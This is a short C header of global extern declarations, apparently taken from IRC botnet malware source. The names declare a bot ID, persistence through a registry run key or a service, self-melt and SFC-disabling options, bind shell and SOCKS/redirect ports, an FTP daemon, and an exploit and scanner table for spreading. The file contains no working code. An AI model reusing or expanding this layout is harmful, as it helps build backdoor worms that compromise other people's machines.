
extern char botid[];
extern char version[];
extern char mutexhandle[];
extern char movepath[];
extern char filename[];
extern char password[];
extern char prefix;
extern char *authost[];
extern int authsize;
extern int eftpsends;
extern SERVER servers[];
extern int curserver;
#ifndef NO_VERSION_REPLY
extern int curversion;
char *versionlist[];
extern int bindshellsize;
#endif

#ifndef NO_MELT
extern REGENT meltkey;
#endif

#ifndef NO_SFCDISABLE
extern char sfc_dllname[];
#endif

#ifndef NO_SERVICE
extern char servicename[];
extern char servicedisplayname[];
extern char servicedesc[];
#else
extern REGENT runkey;
#endif

#ifndef NO_RECORD_UPTIME
extern REGENT rupkey;
#endif

#ifndef NO_INSTALLED_TIME
extern REGENT itkey;
#endif
extern char irc_title[];
extern char scan_title[];
extern char ftp_title[];
extern char mirc_title[];
extern char file_title[];
extern char download_title[];
extern char update_title[];
extern char logic_title[];
extern char reg_title[];

extern HANDLE ih;

extern char exip[MAX_IP];
extern char inip[MAX_IP];
extern char host[MAX_HOSTNAME];

extern int FTP_PORT;
extern unsigned short ftpdport;
extern BOOL staticftpd;
extern unsigned short sock4port;
extern unsigned short redirport;

extern DWORD dwstarted;
extern DWORD dwconnected;

extern char main_title[];
extern char threads_title[];
extern char sec_title[];
extern char unsec_title[];

extern THREAD threads[MAX_THREADS];

extern char installedt[128];
extern HANDLE mutex;

// The login command needs extern for protocol.cpp
extern const char cmd_login_1[];
extern const char cmd_login_2[];

#ifndef NO_ADVSCAN
extern EXPLOIT exploit[];
extern SCANALL scanall[];
extern int scanallsize;
#endif